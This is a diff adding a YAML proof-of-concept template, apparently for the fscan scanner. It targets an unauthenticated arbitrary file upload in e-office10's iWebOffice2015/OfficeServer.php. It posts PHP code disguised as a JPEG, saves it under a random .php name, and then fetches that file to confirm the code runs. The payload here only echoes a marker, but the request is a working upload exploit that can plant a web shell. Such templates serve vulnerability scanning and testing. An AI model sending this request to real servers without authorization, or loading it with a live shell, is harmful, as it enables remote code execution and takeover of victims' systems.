@@ -1,0 +1,35 @@
+name: e-office10-OfficeServer-upload
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+   -  method: POST
+      path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+      body: |
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+        Content-Type: image/jpeg
+        
+        <?php echo "fscan" ?>
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FormData"
+        
+        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{s0}}.php'}
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--     
+      expression: >-
+        response.status == 200 
+
+   -  method: GET
+      path: /eoffice10/server/public/iWebOffice2015/Document/{{s0}}.php
+      follow_redirects: false
+      expression: >-
+        response.body.bcontains(b'fscan')
+
+      search: '(?P<token>\d{5,11})'
+detail: 
+  links: 
+  authors:
+  
